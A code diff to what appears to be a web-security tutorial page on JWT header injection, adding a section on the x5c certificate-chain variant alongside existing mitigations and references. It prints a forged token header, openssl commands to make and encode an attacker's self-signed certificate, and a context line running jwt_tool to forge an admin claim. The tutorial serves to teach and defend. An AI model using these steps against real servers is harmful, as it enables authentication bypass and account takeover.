@@ -129,6 +129,37 @@ python3 jwt_tool.py <JWT> -X i -I -pc sub -pv admin`} />
         </ul>
       </ImpactBox>
 
+      <H2>x5c - the X.509 certificate variant</H2>
+      <P>
+        RFC 7515 §4.1.6 defines <Mono>x5c</Mono> (X.509 Certificate Chain) as the certificate equivalent of <Mono>jwk</Mono>.
+        Instead of embedding the public key as a JWK JSON object, the attacker embeds their X.509 certificate chain
+        directly in the header as an array of base64-encoded DER certificates. A vulnerable server extracts
+        the public key from the first certificate and uses it to verify the signature - same logic, different encoding.
+      </P>
+      <CodeBlock language="json" label="Forged token header with embedded x5c certificate" code={`{
+  "alg": "RS256",
+  "x5c": [
+    "MIICpDCCAYwCCQD..."   // base64-encoded DER of attacker's self-signed certificate
+    // additional chain certificates if needed
+  ]
+}`} />
+      <CodeBlock language="bash" label="Generate and encode the certificate for x5c" code={`# Generate keypair and self-signed cert
+openssl genrsa -out attacker.key 2048
+openssl req -new -x509 -key attacker.key -out attacker.crt -days 365 \\
+  -subj "/CN=attacker"
+
+# Convert DER to base64 for the x5c array value
+openssl x509 -in attacker.crt -outform DER | base64 | tr -d '\\n'
+# → paste this value into the x5c array in the header
+
+# Then sign the forged token with attacker.key
+# A vulnerable server reads x5c[0], extracts the public key, verifies → bypass`} />
+      <P>
+        Unlike <Mono>x5u</Mono>, this attack requires no external hosting - the certificate is self-contained
+        in the token, making it usable even in environments where the server has no outbound internet access.
+        The exploit profile is identical to JWK injection.
+      </P>
+
       <H2>Mitigations</H2>
       <ul className="refs-list" style={{ fontSize: "14px", color: "var(--text-muted)", lineHeight: 2, marginBottom: "24px" }}>
         <li>Never use the <Mono>jwk</Mono> header field as the source of the verification key - always use a server-side trusted key store</li>
@@ -143,6 +174,7 @@ python3 jwt_tool.py <JWT> -X i -I -pc sub -pv admin`} />
         <ul className="refs-list" style={{ fontSize: "13px", color: "var(--text-muted)", lineHeight: 2 }}>
           <li><Ref href="https://portswigger.net/web-security/jwt/exploiting#injecting-self-signed-jwts-via-the-jwk-parameter">PortSwigger - Injecting self-signed JWTs via the jwk parameter</Ref></li>
           <li><Ref href="https://www.rfc-editor.org/rfc/rfc7515#section-4.1.3">RFC 7515 §4.1.3 - jwk (JSON Web Key) Header Parameter</Ref></li>
+          <li><Ref href="https://www.rfc-editor.org/rfc/rfc7515#section-4.1.6">RFC 7515 §4.1.6 - x5c (X.509 Certificate Chain) Header Parameter</Ref></li>
           <li><Ref href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190513-securelogin">Cisco Advisory cisco-sa-20190513-securelogin (CVE-2018-0114)</Ref></li>
           <li><Ref href="https://github.com/nicowillis/CVE-2018-0114">CVE-2018-0114 PoC</Ref></li>
         </ul>
